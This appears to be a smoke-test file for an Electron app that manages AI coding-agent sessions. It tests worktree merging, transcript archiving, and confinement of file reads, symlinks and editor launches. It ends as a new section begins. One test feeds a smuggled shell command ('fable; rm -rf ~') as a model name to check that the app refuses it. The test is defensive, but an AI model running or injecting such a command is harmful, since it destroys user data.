import { app } from 'electron';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { createServer as createNetServer } from 'node:net';
import Database from 'better-sqlite3';
import { SIDEBAR_GROUPS, TABS, TAB_ICONS, TAB_SHORTCUTS } from '../shared/routes';
import { MOBILE_ABSENT, MOBILE_VIEWS, mobileViewLabel } from '../shared/mobile-nav';
import * as limits from './limits';
import { TRUST_COPY, TRUST_LEVELS, trustCopy, trustGlyph } from '../shared/types';
import * as worktrees from './worktrees';
import * as code from './code';
import { loadSource } from './batch/sources';
import * as transcripts from './transcripts';
import * as notify from './notify';
import * as spend from './spend';
import * as evals from './batch/evals';
import * as cachediag from './batch/cachediag';
import * as mcpRegistry from './mcp/registry';
import * as mcpServer from './mcp/server';
import * as ctxConfig from './context/config';
import * as schedule from './schedule';
import * as demo from './demo';
import * as migrate from './migrate';
import * as attention from './attention';
import * as backup from './backup';
import * as hooks from './hooks';
import * as observed from './observed';
import * as otel from './otel';
import * as policy from './policy';
import * as control from './control';
import * as queue from './queue';
import * as accounts from './accounts';
import * as claudeLimits from './claude-limits';
import * as usageAgg from './usage';
import { listGoalTrace, recordGoalTrace } from './goal-trace';
import * as review from './review';
import * as revert from './revert';
import { isManagedRoot } from './roots';
import { redactCredentials } from './redact';
import * as providers from './providers';
import * as plugins from './plugins';
import { adapterTrustPrompt, manifestTrustPrompt } from './pack-consent';
import { mcpTrustPrompt } from './mcp/consent';
import * as batch from './batch';
import { egressReport } from './egress';
import { mobileFleetSnapshot } from './fleet-snapshot';
import * as mobile from './mobile';
import * as tailnet from './tailnet';
import {
  __test as sessionsTest,
  createSession, forgetPastSession, goalCapsuleText, killSession, listSessions, pastSessions,
  reconcileAbandonedSessions, resumeAccountFor, scanCodexNotifications, sessionBaseline, setSessionTuning,
} from './sessions';
import {
  backfillCodexThreadIds, captureNewCodexThreadId, matchCodexThreads, validateExactCodexThread,
} from './codex-sessions';
import { __test as codexUsageTest } from './codex-usage';
import { getSetting, setSetting } from './settings';
import { dataDir, db, resultsDir } from './db';
import { addProject } from './store';
import { permissionModeCopy } from '../shared/types';
import { automationArgv, automationRun, AUTOMATION_ARGV } from './automation';
import { selectedProviderStatus, selectedSessionTelemetry } from '../shared/provider-status';
import { MAX_TERMINAL_INPUT_CHUNK_BYTES, splitTerminalInput } from '../shared/terminal-input';
import { EMPTY_USAGE, type DocketPlanNode, type HookInput, type ProviderInfo, type RunConfig, type Session, type SessionUsage } from '../shared/types';

type Check = (ok: boolean, label: string, detail?: unknown) => void;
type Say = (s: string) => void;

const baseCfg = (over: Partial<RunConfig> = {}): RunConfig => ({
  name: 'smoke', model: 'claude-sonnet-5', maxTokens: 1024,
  system: [{ text: 'You are a classifier.', cache: true }],
  userTemplate: 'Classify {{text}}', cacheTtl: '5m',
  source: { kind: 'jsonl', text: '{"text":"a"}' },
  ...over,
});

/**
 * The checked-out tree this build came from.
 *
 * A handful of assertions below read source rather than call code, because the
 * thing they are about — an IPC channel, a queue runner registered in
 * startServices() — is unreachable from here: the smoke path returns before
 * startServices() ever runs, and there is no renderer to send an IPC message.
 * Reading the source is a weak claim about behaviour and a strong one about
 * presence, and presence is exactly what was missing in every case: each of
 * those channels already had a caller waiting on it.
 */
function appRoot(): string {
  const a = app.getAppPath();
  return fs.existsSync(path.join(a, 'src', 'main')) ? a : process.cwd();
}

/**
 * A path that no longer resolves used to come back as an empty string, and an
 * empty string satisfies every *negated* source assertion in this file. One
 * renamed or moved file therefore turned a block of contracts into a block of
 * vacuous truths that still printed a green tick. Misses are collected and
 * asserted in the wiring section, and the sentinel is short and unmatchable so
 * the positive length and substring checks fail loudly on it too.
 */
const MISSING_SOURCE = '<wanigan: source file not found>';
const missingSources: string[] = [];

function sourceOf(rel: string): string {
  let text: string;
  try { text = fs.readFileSync(path.join(appRoot(), rel), 'utf8'); }
  catch { missingSources.push(rel); return MISSING_SOURCE; }
  // An empty file cannot support an assertion either, and reads the same way.
  if (!text) { missingSources.push(`${rel} (empty)`); return MISSING_SOURCE; }
  return text;
}

function permissionBits(file: string): number {
  return fs.statSync(file).mode & 0o777;
}

/** Every file under a directory, so a check cannot pass by looking at nothing. */
function filesUnder(dir: string): string[] {
  const out: string[] = [];
  let entries: fs.Dirent[];
  try { entries = fs.readdirSync(dir, { withFileTypes: true }); } catch { return out; }
  for (const e of entries) {
    const full = path.join(dir, e.name);
    if (e.isDirectory()) out.push(...filesUnder(full));
    else out.push(full);
  }
  return out.sort();
}

async function unusedLoopbackPort(): Promise<number> {
  const listener = createNetServer();
  await new Promise<void>((resolve, reject) => {
    listener.once('error', reject);
    listener.listen(0, '127.0.0.1', () => resolve());
  });
  const address = listener.address();
  const port = typeof address === 'object' && address ? address.port : 0;
  await new Promise<void>((resolve) => listener.close(() => resolve()));
  if (!port) throw new Error('The OS did not assign a loopback port for the mobile smoke test.');
  return port;
}

/**
 * Second verification pass: the subsystems the lifecycle smoke never reaches.
 * Everything here is offline and spends nothing — a test suite that needs an
 * API key is a test suite nobody runs.
 */
export async function runPhaseSmoke2(check: Check, say: Say): Promise<void> {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'wanigan-p2-'));

  /* ── Codex rollout counters ──────────────────────────────────────── */
  say('── Codex rollout accounting');
  const rollout = path.join(tmp, 'rollout.jsonl');
  fs.writeFileSync(rollout, [
    JSON.stringify({ timestamp: '2026-08-29T18:00:00.000Z', payload: { type: 'token_count', info: {
      total_token_usage: { input_tokens: 100, cached_input_tokens: 40, output_tokens: 12 },
    } } }),
    // A real rollout can be caught during its final write.  The previous,
    // complete counter remains authoritative instead of blanking the Fleet.
    '{"timestamp":"partial',
  ].join('\n'));
  const codexUsage = codexUsageTest.readSnapshot(rollout);
  check(codexUsage?.inTokens === 60 && codexUsage.cacheRead === 40 && codexUsage.outTokens === 12,
    'Codex counters split uncached input, cached input and output without double-counting', codexUsage);
  check(codexUsage?.totalTokens === 112,
    'Codex total tokens keep cached input as a subset, not a second charge', codexUsage);

  /* ── selected provider header ─────────────────────────────────────── */
  say('── selected provider header');
  const headerProviders = [
    { id: 'codex', label: 'Codex' },
    { id: 'claude', label: 'Claude Code' },
    { id: 'glm', label: 'GLM · Z.ai' },
    { id: 'deepseek', label: 'DeepSeek' },
  ] as ProviderInfo[];
  const headerSession = (id: string, providerId: string, harnessId: string, label?: string, status: Session['status'] = 'running') => ({
    id, providerId, harnessId, status,
    providerProfile: label ? { label } : null,
  }) as Session;
  const codexHeader = selectedProviderStatus(headerSession('s_header_codex', 'codex', 'codex'), headerProviders);
  const claudeHeader = selectedProviderStatus(headerSession('s_header_claude', 'claude', 'claude-code'), headerProviders);
  const glmHeader = selectedProviderStatus(headerSession('s_header_glm', 'glm', 'claude-code'), headerProviders);
  const deepseekHeader = selectedProviderStatus(headerSession('s_header_deepseek', 'deepseek', 'claude-code', 'DeepSeek'), headerProviders);
  check(selectedProviderStatus(null, headerProviders) === null
    && codexHeader?.label === 'Codex' && codexHeader.usesCodexAccountLimits
    && claudeHeader?.label === 'Claude Code' && !claudeHeader.usesCodexAccountLimits
    && glmHeader?.label === 'GLM · Z.ai' && !glmHeader.usesCodexAccountLimits
    && deepseekHeader?.label === 'DeepSeek' && !deepseekHeader.usesCodexAccountLimits,
  'the header follows the selected frozen provider profile and never defaults a Claude/GLM/DeepSeek session to Codex limits');
  const headerTelemetry = {
    sessionId: 's_header_claude', inTokens: 500, outTokens: 1_900, cacheRead: 100, cacheWrite: 0,
    costUsd: 0, costStatus: 'unavailable', linesAdded: 0, linesRemoved: 0, commits: 0, pullRequests: 0,
    activeSeconds: 0, requests: 1, errors: 0, refusals: 0, lastAt: null, models: [],
  } as SessionUsage;
  check(selectedSessionTelemetry(headerTelemetry, 'running') === '2.5k tokens'
    && selectedSessionTelemetry(null, 'starting') === 'starting'
    && selectedSessionTelemetry(null, 'exited') === 'ended',
  'non-Codex header values are selected-session telemetry or state, never a fabricated account percentage');

  /* ── one provider tint table ──────────────────────────────────────── */
  // Sessions, Fleet and NewSessionDialog each carried their own copy of the
  // provider colour map and the copies had drifted: only the dialog knew
  // DeepSeek, so a running DeepSeek session drew its rail dot in no colour at
  // all — React drops an undefined background and .session-item .dot paints
  // none of its own. providerTint is the one table now, and because the ids
  // reaching it come from untrusted pack manifests, an inherited Object key
  // has to fall through to the accent the same way an unknown pack id does.
  const { providerTint } = await import('../shared/provider-status');
  const rendererTintTables = filesUnder(path.join(appRoot(), 'src/renderer/src'))
    .filter((f) => /\.tsx?$/.test(f) && /const\s+\w*TINT\w*\s*[:=]/.test(fs.readFileSync(f, 'utf8')))
    .map((f) => path.relative(appRoot(), f));
  check(providerTint('claude') === 'var(--claude)'
    && providerTint('codex') === 'var(--codex)'
    && providerTint('glm') === 'var(--glm)'
    && providerTint('deepseek') === 'var(--series-4)'
    && providerTint('acme.pack/coder') === 'var(--accent)'
    && providerTint('') === 'var(--accent)'
    && providerTint('toString') === 'var(--accent)'
    && providerTint('constructor') === 'var(--accent)'
    && rendererTintTables.length === 0,
  'every provider row tints from one shared table: the shipped DeepSeek profile has a colour, and an id this build has no colour for draws in the accent rather than transparent',
  `renderer files still declaring a tint table: ${rendererTintTables.join(', ') || 'none'}`);

  /* ── the compact session rail obeys the motion setting ────────────── */
  // Two separate defects, and only one of them was a literal. The rail's slide
  // now reads --mo-state, and its visibility flip rides the same token rather
  // than the old 0s-plus-140ms-delay pair, so the rail is still painted while
  // it slides out and gone the frame it lands — with no second literal for the
  // setting to miss. The other half was an @media (prefers-reduced-motion:
  // reduce) block in each of these two sheets with no [data-motion] guard: it
  // silenced a deliberate Motion = full, which motion.css's own reduced-motion
  // rule is careful not to do. Both sheets take reduced motion from the tokens
  // now, so neither should mention the query at all.
  const railCssSrc = sourceOf('src/renderer/src/styles/sessions.css');
  const timelineCssSrc = sourceOf('src/renderer/src/styles/timeline.css');
  check(railCssSrc.includes('transition: transform var(--mo-state) var(--mo-ease), visibility var(--mo-state) linear;')
    && !railCssSrc.includes('prefers-reduced-motion')
    && !timelineCssSrc.includes('prefers-reduced-motion'),
  "the compact session rail slides and hides on --mo-state, and neither sheet re-silences motion behind the operator's deliberate Motion = full");

  /* ── every duration comes from the motion tokens ──────────────────── */
  // motion.css zeroes --mo-state when the operator picks Motion = off and when
  // the OS asks for reduced motion, so a sheet that spells its own 140ms or
  // .12s quietly opts that one element out of both settings. Nine declarations
  // did, and the worst of them slid a rail beside a live PTY for 140ms no
  // matter what the operator had asked for. Re-deriving the style gate's own
  // regex here covers the half the gate cannot: an empty DURATION_BASELINE is
  // what makes its ratchet absolute, and a baseline edit would re-open the debt
  // without touching a sheet.
  const DURATION_LITERAL = /\b(?:transition|animation)[\w-]*:[^;{}]*?[\s,(]([0-9]*\.?[0-9]+)m?s(?![\w-])/g;
  const literalDurationFiles = filesUnder(path.join(appRoot(), 'src/renderer/src'))
    .filter((f) => /\.(?:css|tsx)$/.test(f) && path.basename(f) !== 'motion.css')
    .filter((f) => (fs.readFileSync(f, 'utf8').match(DURATION_LITERAL) || []).length > 0)
    .map((f) => path.relative(appRoot(), f));
  const styleGateSrc = sourceOf('scripts/check-renderer-style.cjs');
  check(literalDurationFiles.length === 0
    && /const DURATION_BASELINE = \{\};/.test(styleGateSrc),
  'no renderer file outside motion.css spells its own transition duration, and the style gate baseline is empty so none can be added back',
  `renderer files with a literal duration: ${literalDurationFiles.join(', ') || 'none'}`);

  /* ── phase 9 · worktrees against a real repo ───────────────────────── */
  say('── phase 9 · worktrees');
  const repo = path.join(tmp, 'repo');
  fs.mkdirSync(repo, { recursive: true });
  const git = (...a: string[]) => execFileSync('git', ['-C', repo, ...a], { stdio: 'pipe' }).toString();
  try {
    git('init', '-q', '-b', 'main');
    git('config', 'user.email', 'smoke@wanigan.test');
    git('config', 'user.name', 'Smoke');
    fs.writeFileSync(path.join(repo, 'a.txt'), 'one\n');
    git('add', '-A');
    git('commit', '-qm', 'first');

    const root = await worktrees.repoRootFor(repo);
    check(root !== null && fs.existsSync(root), 'the repo root resolves');

    const wt = await worktrees.createWorktree(repo, 'smoke', 's_smoke');
    check(fs.existsSync(wt.path), `a worktree was created at ${path.basename(wt.path)}`);
    // Outside the repo on purpose: a worktree inside it shows up in the repo's
    // own listings and globs, and an agent will find it and get confused.
    check(!path.resolve(wt.path).startsWith(path.resolve(repo) + path.sep),
      'the worktree lives outside the repo it belongs to');
    check((wt.branch ?? '').includes('wanigan/'), 'the branch is namespaced to Wanigan', wt.branch);

    const listed = await worktrees.listWorktrees(repo);
    check(listed.some((w) => w.path === wt.path), 'the worktree is listed by git');

    // Refusing to destroy uncommitted work is the whole safety property.
    fs.writeFileSync(path.join(wt.path, 'dirty.txt'), 'unsaved\n');
    const refused = await worktrees.removeWorktree(wt.path, false);
    check(!refused.removed, 'a dirty worktree is not removed without force');
    check(/\d/.test(refused.detail), 'the refusal names how many files would be lost', refused.detail);

    const forced = await worktrees.removeWorktree(wt.path, true);
    check(forced.removed, 'force removes it');
  } catch (e) {
    check(false, `worktree suite threw: ${e instanceof Error ? e.message : String(e)}`);
  }

  /* ── phase 9 · landing a worktree back on its base ─────────────────── */
  // A fleet run ends with N worktrees holding the only copy of the work, and
  // until worktrees:merge existed there was no way to land any of them from
  // inside the app. Now that there is a button, the refusals are the feature.
  say('── phase 9 · merging a worktree');
  const mrepo = path.join(tmp, 'mrepo');
  fs.mkdirSync(mrepo, { recursive: true });
  const gitIn = (dir: string, ...a: string[]) => execFileSync('git', ['-C', dir, ...a], { stdio: 'pipe' }).toString();
  try {
    gitIn(mrepo, 'init', '-q', '-b', 'main');
    gitIn(mrepo, 'config', 'user.email', 'smoke@wanigan.test');
    gitIn(mrepo, 'config', 'user.name', 'Smoke');
    fs.writeFileSync(path.join(mrepo, 'a.txt'), 'one\n');
    gitIn(mrepo, 'add', '-A');
    gitIn(mrepo, 'commit', '-qm', 'first');

    const mwt = await worktrees.createWorktree(mrepo, 'merge', 's_merge');

    const empty = await worktrees.mergeWorktree(mwt.path);
    check(!empty.merged && /nothing to merge/i.test(empty.detail),
      'a worktree with no commits of its own is refused, and told to commit first', empty.detail);

    // The refusal that matters most: merging the committed half and leaving the
    // rest behind is not something a person can undo by reading the detail line.
    fs.writeFileSync(path.join(mwt.path, 'b.txt'), 'two\n');
    const dirty = await worktrees.mergeWorktree(mwt.path);
    check(!dirty.merged && /uncommitted/i.test(dirty.detail),
      'an uncommitted file in the worktree is refused rather than half-merged', dirty.detail);

    gitIn(mwt.path, 'add', '-A');
    gitIn(mwt.path, 'commit', '-qm', 'agent work');

    // Two merges into one repo both land in the tree holding the base branch,
    // so the loser's `merge --abort` would reach into the winner's finished
    // merge and back it out — in the tree holding the only copy of the work.
    const [one, two] = await Promise.all([
      worktrees.mergeWorktree(mwt.path),
      worktrees.mergeWorktree(mwt.path),
    ]);
    const blocked = [one, two].filter((r) => /already running/i.test(r.detail));
    check(blocked.length === 1, 'two simultaneous merges into one repo do not interleave — exactly one is refused',
      `${one.detail} // ${two.detail}`);
    const landed = [one, two].find((r) => r.merged);
    check(landed !== undefined, 'and the other one lands', `${one.detail} // ${two.detail}`);
    check(/touching 1 file/.test(landed?.detail ?? ''),
      'the success line counts the files it actually touched, never a failed count read as zero', landed?.detail);
    check(fs.existsSync(path.join(mrepo, 'b.txt')), "the commit really is in the base branch's working tree");

    await worktrees.removeWorktree(mwt.path, true);
  } catch (e) {
    check(false, `worktree merge suite threw: ${e instanceof Error ? e.message : String(e)}`);
  }

  /* ── phase 4 · transcript search survives hostile input ────────────── */
  say('── phase 4 · transcripts');
  check(transcripts.transcriptPathFor(path.join(tmp, 'nope'), null) === null,
    'a project with no transcript returns null rather than throwing');
  // A bare quote or a lone * is an FTS5 syntax error. Users type apostrophes.
  for (const q of ["it's", '*', '"', 'a AND', 'NEAR(']) {
    let threw = false;
    try { transcripts.searchTranscripts(q, 5); } catch { threw = true; }
    check(!threw, `search survives the query ${JSON.stringify(q)}`);
  }

  /* ── Files panel · symlinks never escape the project ──────────────── */
  say('── Files panel confinement');
  try {
    const filesRoot = path.join(tmp, 'files-panel');
    const outside = path.join(tmp, 'not-in-project.txt');
    fs.mkdirSync(filesRoot, { recursive: true });
    fs.writeFileSync(path.join(filesRoot, 'inside.txt'), 'inside the project\n');
    fs.writeFileSync(outside, 'this must not appear in the Files panel\n');
    fs.symlinkSync(outside, path.join(filesRoot, 'escape.txt'), 'file');
    // The Files panel only ever reads a project the user added; roots now have
    // to be ones Wanigan manages, so the fixture registers itself the way the
    // real path does.
    await addProject(filesRoot);

    let unmanaged = false;
    try { code.listDir(path.join(tmp, 'never-added'), ''); }
    catch (error) { unmanaged = /manages/i.test(error instanceof Error ? error.message : String(error)); }
    check(unmanaged, 'a root that is not a registered project or worktree is refused before any read');

    const listed = code.listDir(filesRoot, '');
    check(listed.some((entry) => entry.name === 'inside.txt') && !listed.some((entry) => entry.name === 'escape.txt'),
      'the Files panel lists ordinary project files but omits symlinks');
    check(code.readProjectFile(filesRoot, 'inside.txt').text.includes('inside the project'),
      'the Files panel still reads an ordinary in-project file');
    let rejected = false;
    try { code.readProjectFile(filesRoot, 'escape.txt'); }
    catch (error) { rejected = /symlink|outside the project/i.test(error instanceof Error ? error.message : String(error)); }
    check(rejected,
      'a direct Files-panel read through a repository symlink is rejected rather than following it');

    const globRows = await loadSource({ kind: 'glob', root: filesRoot, pattern: '**/*', maxBytes: 1024 });
    const listedRows = await loadSource({ kind: 'files', root: filesRoot, paths: ['inside.txt', 'escape.txt'], maxBytes: 1024 });
    check(globRows.rows.length === 1 && listedRows.rows.length === 1
      && !JSON.stringify([...globRows.rows, ...listedRows.rows]).includes('must not appear'),
    'batch file and glob sources also refuse repository symlinks outside their root');

    // The acting git surface takes a root from the renderer too, and it deletes
    // and checks out files rather than reading them. It is confined by the same
    // managed-root rule, canonicalised, so the fixtures above serve both.
    const rootChecks = {
      self: isManagedRoot(filesRoot),
      child: isManagedRoot(path.join(filesRoot, 'src', 'main')),
      unrelated: isManagedRoot(path.join(tmp, 'never-added')),
      empty: isManagedRoot(''),
    };
    check(rootChecks.self && rootChecks.child && !rootChecks.unrelated && !rootChecks.empty,
      'a managed root covers its own subdirectories and nothing outside every project and worktree',
      JSON.stringify(rootChecks));
    const unmanagedRevert = await revert.planRevert(path.join(tmp, 'never-added'), 'inside.txt', 'HEAD', false);
    check(unmanagedRevert.action === 'nothing' && !unmanagedRevert.safe
      && /does not resolve inside a project Wanigan manages/.test(unmanagedRevert.detail),
    'a revert named against an unmanaged root is refused before git is asked anything', unmanagedRevert.detail);
    const escapedRevert = await revert.planRevert(filesRoot, 'escape.txt', 'HEAD', false);
    check(escapedRevert.action === 'nothing' && !escapedRevert.safe
      && /does not resolve inside a project Wanigan manages/.test(escapedRevert.detail),
    'and a symlink inside a managed project cannot carry a revert out of it', escapedRevert.detail);
    const unmanagedBatch = await revert.revertAll(path.join(tmp, 'never-added'), [{ path: 'inside.txt' }], 'HEAD');
    check(unmanagedBatch.reverted.length === 0 && unmanagedBatch.failed.length === 1
      && /outside every project and worktree/.test(unmanagedBatch.failed[0]?.detail ?? '')
      && fs.readFileSync(outside, 'utf8').includes('must not appear'),
    'the batch path refuses an unmanaged root once for the whole set, and nothing outside the project is touched',
    unmanagedBatch.failed[0]?.detail);
  } catch (error) {
    check(false, `Files-panel confinement suite threw: ${error instanceof Error ? error.message : String(error)}`);
  }

  /* ── plugin reader · rendered docs never escape the plugin store ─── */
  say('── plugin reader confinement');
  try {
    const pluginRoot = path.join(tmp, 'plugins');
    const pluginDir = path.join(pluginRoot, 'cache', 'market', 'example', '1.0.0');
    const doc = path.join(pluginDir, 'README.md');
    const secret = path.join(tmp, 'not-a-plugin-secret.txt');
    fs.mkdirSync(pluginDir, { recursive: true });
    fs.writeFileSync(doc, 'ordinary plugin documentation\n');
    fs.writeFileSync(secret, 'this must never reach the plugin reader\n');
    fs.symlinkSync(secret, path.join(pluginDir, 'outside.md'), 'file');
    const ordinary = plugins.readPluginFile(doc, pluginRoot);
    let rejectedPluginLink = false;
    try { plugins.readPluginFile(path.join(pluginDir, 'outside.md'), pluginRoot); }
    catch (error) { rejectedPluginLink = /outside the plugins directory|not follow/i.test(error instanceof Error ? error.message : String(error)); }
    const large = path.join(pluginDir, 'large.md');
    fs.writeFileSync(large, Buffer.alloc(200 * 1024 + 8, 'x'));
    const preview = plugins.readPluginFile(large, pluginRoot);
    check(ordinary.text.includes('ordinary plugin documentation') && rejectedPluginLink,
      'the plugin reading pane accepts a real plugin document but refuses a symlink outside its root');
    check(preview.truncated && preview.bytes === 200 * 1024 + 8 && Buffer.byteLength(preview.text) <= 200 * 1024,
      'the plugin reading pane reads only its bounded preview budget for a large document');
  } catch (error) {
    check(false, `Plugin reader confinement suite threw: ${error instanceof Error ? error.message : String(error)}`);
  }

  /* ── terminal input · bound fire-and-forget PTY traffic ───────────── */
  say('── terminal input boundary');
  check(
    sessionsTest.acceptsPtyInput('live-session', 'hello\r')
      && !sessionsTest.acceptsPtyInput('x'.repeat(201), 'hello')
      && !sessionsTest.acceptsPtyInput('live-session', 'x'.repeat(256 * 1024 + 1))
      && sessionsTest.acceptsPtyResize('live-session', 160, 48)
      && !sessionsTest.acceptsPtyResize('live-session', 0, 48)
      && !sessionsTest.acceptsPtyResize('live-session', 1001, 48)
      && !sessionsTest.acceptsPtyResize('live-session', 160, 501),
    'renderer PTY traffic has bounded input, session identifiers, and terminal geometry before node-pty receives it',
  );
  const pastedTerminalText = `${'a'.repeat(300 * 1024 - 4)}🙂`;
  const pastedTerminalChunks = splitTerminalInput(pastedTerminalText);
  check(
    pastedTerminalChunks.length > 1
      && pastedTerminalChunks.join('') === pastedTerminalText
      && pastedTerminalChunks.every((chunk) => Buffer.byteLength(chunk, 'utf8') <= MAX_TERMINAL_INPUT_CHUNK_BYTES)
      && pastedTerminalChunks.every((chunk) => Buffer.from(chunk, 'utf8').toString('utf8') === chunk),
    'a 300 KiB Unicode terminal paste stays ordered and whole while every IPC message remains bounded',
  );
  check(
    !setSessionTuning('no-such-session', 'effort', 'max')
      && !setSessionTuning('no-such-session', 'effort', 'ultra')
      && !setSessionTuning('no-such-session', 'model', 'fable; rm -rf ~')
      && !setSessionTuning('no-such-session', 'model', 'fable max')
      && !setSessionTuning('no-such-session', 'permissionMode', 'bypassPermissions'),
    'session tuning refuses an unknown session, an effort outside EFFORT_LEVELS, a model that is not one shell-safe token, and any field other than model/effort',
  );

  /* ── external editor launcher · renderer may not choose a program ─── */
  say('── external editor launcher boundary');
  try {
    const detectedEditor = path.join(tmp, 'editor-bin', 'code');
    fs.mkdirSync(path.dirname(detectedEditor), { recursive: true });
    fs.writeFileSync(detectedEditor, '#!/bin/sh\nexit 0\n');
    fs.chmodSync(detectedEditor, 0o755);
    // Both exits of openInEditor act on the target — LaunchServices decides
    // what "open" means, or an editor process is handed it as an argument — so
    // the containment check has to sit above the branch that picks between
    // them. It guarded only the Finder exit, which left the editor exit
    // reaching exec() with any absolute path the renderer named. The launcher
    // refusal must be the containment one, not "that editor is no longer
    // available": the wrong message means detectEditors() ran first and the
    // check is back on one arm of the branch.
    const unmanagedDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wanigan-unmanaged-'));
    const unmanagedTarget = path.join(unmanagedDir, 'secret.txt');
    fs.writeFileSync(unmanagedTarget, 'not inside any project');
    const openRefusal = async (editor: string | null): Promise<string> => {
      try { await code.openInEditor(editor, unmanagedTarget); return 'opened'; }
      catch (error) { return error instanceof Error ? error.message : String(error); }
    };
    const finderExit = await openRefusal(null);
    const launcherExit = await openRefusal(detectedEditor);
    check(/not inside a project Wanigan manages/.test(finderExit)
      && /not inside a project Wanigan manages/.test(launcherExit),
    'openInEditor refuses a target under no managed root on both exits, before Finder opens it or an editor is spawned',
    { finderExit, launcherExit });
    fs.rmSync(unmanagedDir, { recursive: true, force: true });
    const editorTarget = code.__test.normalizeEditorTarget('--disable-gpu');
    check(path.isAbsolute(editorTarget) && path.basename(editorTarget) === '--disable-gpu',
      'an editor target is made absolute, so a filename beginning with a dash cannot become a CLI option', editorTarget);
    check(code.__test.isExecutableFile(detectedEditor)
      && !code.__test.isExecutableFile(path.dirname(detectedEditor))
      && code.__test.approvedEditorPath(path.join(tmp, 'editor-bin', '.', 'code'), [
        { id: 'code', label: 'VS Code', path: detectedEditor },
      ]) === detectedEditor,
    'an editor must be an executable file and the selected launcher resolves only to one Wanigan detected');
    let rejectedUnlisted = false;
    let rejectedMalformed = false;
    let rejectedLine = false;
    try { code.__test.approvedEditorPath(path.join(tmp, 'not-an-editor'), []); }
    catch { rejectedUnlisted = true; }
    try { code.__test.normalizeEditorTarget(`safe\0not-safe`); }
    catch { rejectedMalformed = true; }
    try { code.__test.normalizeEditorLine(0); }
    catch { rejectedLine = true; }
    check(rejectedUnlisted && rejectedMalformed && rejectedLine
      && code.__test.normalizeEditorLine(42) === 42
      && code.__test.normalizeEditorLine(undefined) === undefined,
    'unlisted launchers, malformed paths and invalid line numbers are rejected before a process is started');
  } catch (error) {
    check(false, `External editor launcher boundary suite threw: ${error instanceof Error ? error.message : String(error)}`);
  }

  /* ── phase 4 · archiving follows the CLI, not the provider label ───── */
  // GLM is the Claude Code binary pointed at Z.ai, so it fills ~/.claude/projects
  // exactly as Claude does. Testing the provider id here refused every GLM
  // session with "glm sessions do not write a transcript file", which was not
  // true — the session had telemetry, a queue entry, and no archive of the
  // conversation that produced them.
  say('── phase 4 · transcripts per CLI');
  const claudeHome = fs.mkdtempSync(path.join(os.tmpdir(), 'wanigan-cfg-'));
  const prevConfigDir = process.env.CLAUDE_CONFIG_DIR;
  process.env.CLAUDE_CONFIG_DIR = claudeHome;
  try {
    const trepo = path.join(tmp, 'trepo');
    fs.mkdirSync(trepo, { recursive: true });
    const slug = path.resolve(trepo).replace(/[^a-zA-Z0-9]/g, '-');
    fs.mkdirSync(path.join(claudeHome, 'projects', slug), { recursive: true });
    const conv = 'smoke-conversation-0001';
    fs.writeFileSync(
      path.join(claudeHome, 'projects', slug, `${conv}.jsonl`),
      JSON.stringify({
        type: 'user',
        message: { role: 'user', content: 'wanigan smoke transcript zeppelin' },
        timestamp: new Date().toISOString(),
      }) + '\n'
    );

    // A permissive directory/file can survive an older version or a changed
    // umask. Archiving must correct both before leaving a new transcript copy.
    fs.mkdirSync(transcripts.transcriptsDir(), { recursive: true, mode: 0o755 });
    fs.chmodSync(transcripts.transcriptsDir(), 0o755);
    const staleArchive = path.join(transcripts.transcriptsDir(), 's_smoke_glm.jsonl');
    fs.writeFileSync(staleArchive, 'stale transcript\n', { mode: 0o644 });
    fs.chmodSync(staleArchive, 0o644);

    const logRow = db().prepare(`
      INSERT INTO session_log (id, conversation_id, provider_id, project_id, project_path,
                               project_name, started_at, bin, harness_id, provider_profile_json)
      VALUES (?,?,?,?,?,?,?,?,?,?)
    `);
    const startedAt = Date.now() - 60_000;
    logRow.run('s_smoke_glm', conv, 'glm', null, trepo, 'trepo', startedAt, '/usr/local/bin/claude', null, null);
    logRow.run('s_smoke_codex', conv, 'codex', null, trepo, 'trepo', startedAt, '/usr/local/bin/codex', null, null);
    logRow.run('s_smoke_frozen_claude', conv, 'removed-claude-profile', null, trepo, 'trepo', startedAt,
      '/opt/provider/bin', 'claude-code', JSON.stringify({ harness: 'claude-code' }));
    logRow.run('s_smoke_frozen_codex', conv, 'claude', null, trepo, 'trepo', startedAt,
      '/opt/provider/bin', 'codex', JSON.stringify({ harness: 'codex' }));
    logRow.run('s_smoke_profile_fallback', conv, 'removed-profile-migration-row', null, trepo, 'trepo', startedAt,
      '/opt/provider/bin', null, JSON.stringify({ harness: 'claude-code' }));

    const glm = transcripts.archiveSession('s_smoke_glm', trepo, conv);
    check(glm.ok, 'a GLM session is archived — it runs the claude CLI and writes the same file', glm.note);
    check(fs.existsSync(path.join(transcripts.transcriptsDir(), 's_smoke_glm.jsonl')),
      'the bytes are copied into Wanigan’s own directory, which is the record of truth');
    check(permissionBits(transcripts.transcriptsDir()) === 0o700 && permissionBits(staleArchive) === 0o600,
      'archived transcript directories and overwritten transcript files are owner-only');
    const hits = transcripts.searchTranscripts('zeppelin', 10);
    const mine = hits.find((h) => h.sessionId === 's_smoke_glm');
    check(mine !== undefined, 'and its turns are searchable', hits.length);
    // Folding glm into claude here badges another model's answers with Claude's
    // identity on every result — harmless while GLM was never indexed, wrong now.
    check(mine?.providerId === 'glm', 'a GLM hit is badged glm rather than folded into claude', mine?.providerId);

    // Codex writes no such file, so without the refusal a Codex session run in a
    // repo Claude has also worked in adopts Claude's transcript and presents
    // another agent's conversation as its own.
    const codex = transcripts.archiveSession('s_smoke_codex', trepo, conv);
    check(!codex.ok, 'a Codex session is still refused, with a Claude transcript sitting right there');
    check(/codex/.test(codex.note), 'and the refusal names the provider it is talking about', codex.note);
    const frozenClaude = transcripts.archiveSession('s_smoke_frozen_claude', trepo, conv);
    check(frozenClaude.ok,
      'a removed provider still archives by the Claude-compatible harness frozen at launch', frozenClaude.note);
    const frozenCodex = transcripts.archiveSession('s_smoke_frozen_codex', trepo, conv);
    check(!frozenCodex.ok,
      'a frozen non-Claude harness cannot adopt a Claude transcript even when its old provider id now resolves to Claude');
    const profileFallback = transcripts.archiveSession('s_smoke_profile_fallback', trepo, conv);
    check(profileFallback.ok,
      'migration-era history falls back to the frozen profile JSON before consulting today\'s provider registry', profileFallback.note);
  } finally {
    if (prevConfigDir === undefined) delete process.env.CLAUDE_CONFIG_DIR;
    else process.env.CLAUDE_CONFIG_DIR = prevConfigDir;
    fs.rmSync(claudeHome, { recursive: true, force: true });
  }

  /* ── local storage permissions ────────────────────────────────────── */
